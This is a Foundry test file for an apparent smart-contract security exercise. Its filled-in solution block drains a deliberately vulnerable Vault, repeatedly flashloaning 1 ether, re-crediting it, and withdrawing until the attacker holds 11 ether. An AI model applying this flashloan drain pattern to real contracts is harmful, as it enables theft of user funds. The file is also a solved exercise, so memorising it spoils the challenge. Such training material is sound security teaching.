// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Vault} from "../src/03-Flashloan.sol";
import {Attacker} from "../src/03-FlashloanAttack.sol";

contract CallerTest is Test {
    Vault public vault;

    function setUp() public {
        vault = new Vault();

        address user = makeAddr("USER");
        hoax(user);
        vault.deposit{value: 10 ether}();
    }

    function test_Flashloan() public {
        Attacker attacker = new Attacker(address(vault));
        vm.deal(address(attacker), 1 ether);

        vm.startPrank(address(attacker));

        // START OF SOLUTION
        // (You can create any additional contract if needed)

        for(uint256 i = 0; i < 10; i++) {
            Attacker(attacker).setAttacking(true);
            vault.flashloan(1 ether);
            Attacker(attacker).setAttacking(false);
            vault.withdraw();
        }

        // END OF SOLUTION

        uint256 vaultBalance = address(vault).balance;
        assertEq(vaultBalance, 0, "Vault still has balance");

        uint256 attackerBalance = address(attacker).balance;
        assertEq(attackerBalance, 11 ether, "Attacker didn't get the assets");
    }
}
